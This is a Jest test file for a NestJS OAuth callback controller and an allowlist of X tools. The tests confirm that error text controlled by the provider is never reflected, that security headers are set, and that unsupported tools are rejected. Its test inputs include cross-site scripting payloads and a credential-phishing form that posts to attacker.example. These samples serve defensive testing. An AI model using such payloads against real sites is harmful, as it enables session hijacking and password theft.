import { BadRequestException, Logger } from "@nestjs/common";
import {
  XMarketplaceBridgeToolsController,
  XMarketplaceOAuthCallbackController,
} from "./x-marketplace.controller";

describe("XMarketplaceOAuthCallbackController response boundary", () => {
  const completeOAuth = jest.fn();
  const controller = new XMarketplaceOAuthCallbackController({
    completeOAuth,
  } as any);

  const responseFixture = () => {
    const response = {
      status: jest.fn(),
      type: jest.fn(),
      set: jest.fn(),
      send: jest.fn(),
      redirect: jest.fn(),
    };
    response.status.mockReturnValue(response);
    response.type.mockReturnValue(response);
    response.set.mockReturnValue(response);
    response.send.mockReturnValue(response);
    response.redirect.mockReturnValue(response);
    return response;
  };

  beforeEach(() => {
    jest.clearAllMocks();
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  it.each([
    "<script>globalThis.compromised=true</script>",
    '<form action="https://attacker.example"><input name="password"></form>',
    '<img src=x onerror="alert(document.domain)">',
  ])(
    "never reflects provider-controlled error descriptions: %s",
    async (providerDescription) => {
      const response = responseFixture();
      const warn = jest
        .spyOn(Logger.prototype, "warn")
        .mockImplementation(() => undefined);

      await controller.callback(
        "provider-state",
        "",
        "access_denied",
        providerDescription,
        response as any,
      );

      expect(completeOAuth).not.toHaveBeenCalled();
      expect(response.status).toHaveBeenCalledWith(400);
      expect(response.type).toHaveBeenCalledWith("text/plain");
      expect(response.set).toHaveBeenCalledWith(
        expect.objectContaining({
          "Cache-Control": "no-store",
          "Content-Security-Policy":
            "default-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'",
          "Referrer-Policy": "no-referrer",
          "X-Content-Type-Options": "nosniff",
          "X-Frame-Options": "DENY",
        }),
      );
      expect(response.send).toHaveBeenCalledWith(
        "X authorization failed. Return to ClawChat and try again.",
      );
      expect(JSON.stringify(response.send.mock.calls)).not.toContain(
        providerDescription,
      );
      expect(JSON.stringify(warn.mock.calls)).not.toContain(
        providerDescription,
      );
      expect(warn).toHaveBeenCalledWith(
        "X OAuth callback rejected: access_denied",
      );
    },
  );

  it("collapses attacker-controlled error codes before logging", async () => {
    const response = responseFixture();
    const maliciousCode = "bad\ncode<script>alert(1)</script>";
    const warn = jest
      .spyOn(Logger.prototype, "warn")
      .mockImplementation(() => undefined);

    await controller.callback(
      "provider-state",
      "",
      maliciousCode,
      "provider detail",
      response as any,
    );

    expect(warn).toHaveBeenCalledWith(
      "X OAuth callback rejected: unknown_oauth_error",
    );
    expect(JSON.stringify(warn.mock.calls)).not.toContain(maliciousCode);
  });

  it("uses the same plain-text security policy for the static success page", async () => {
    completeOAuth.mockResolvedValueOnce({ returnTo: null });
    const response = responseFixture();

    await controller.callback(
      "valid-state",
      "valid-code",
      undefined,
      undefined,
      response as any,
    );

    expect(completeOAuth).toHaveBeenCalledWith({
      state: "valid-state",
      code: "valid-code",
    });
    expect(response.status).toHaveBeenCalledWith(200);
    expect(response.type).toHaveBeenCalledWith("text/plain");
    expect(response.set).toHaveBeenCalledWith(
      expect.objectContaining({
        "Cache-Control": "no-store",
        "Content-Security-Policy": expect.stringContaining(
          "default-src 'none'",
        ),
        "X-Content-Type-Options": "nosniff",
      }),
    );
    expect(response.send).toHaveBeenCalledWith(
      "X authorization completed. You can return to ClawChat.",
    );
  });
});

describe("XMarketplaceBridgeToolsController current wrapper allowlist", () => {
  const service = {
    readAccount: jest.fn(async () => ({ id: "123" })),
    readOwnPosts: jest.fn(async () => []),
    createDraft: jest.fn((text: string) => ({ text, providerCallMade: false })),
    createTextPost: jest.fn(async () => ({ published: true })),
  };
  const controller = new XMarketplaceBridgeToolsController(
    {} as any,
    service as any,
    {} as any,
    {} as any,
    {} as any,
    {} as any,
  );
  const input = {
    workspaceId: "workspace-id",
    userId: "user-id",
    agentId: "agent-id",
    connectionId: "connection-id",
    body: { text: "Hello", approvalId: "11111111-1111-4111-8111-111111111111" },
  };

  it("supports exactly the four stable X wrappers", async () => {
    const supported = (controller as any).isSupportedToolName.bind(controller);
    expect(
      [
        "relay_x_get_account",
        "relay_x_list_own_posts",
        "relay_x_draft_text_post",
        "relay_x_publish_text_post",
      ].every(supported),
    ).toBe(true);
    expect(supported("x.reply.create")).toBe(false);
    expect(supported("x_post_tweet")).toBe(false);
  });

  it("routes current wrappers and rejects legacy actions", async () => {
    await expect(
      (controller as any).executeXTool({
        ...input,
        toolName: "relay_x_get_account",
      }),
    ).resolves.toEqual({ id: "123" });
    await expect(
      (controller as any).executeXTool({
        ...input,
        toolName: "relay_x_draft_text_post",
      }),
    ).resolves.toEqual({ text: "Hello", providerCallMade: false });
    await expect(
      (controller as any).executeXTool({
        ...input,
        toolName: "x.reply.create",
      }),
    ).rejects.toBeInstanceOf(BadRequestException);
  });
});
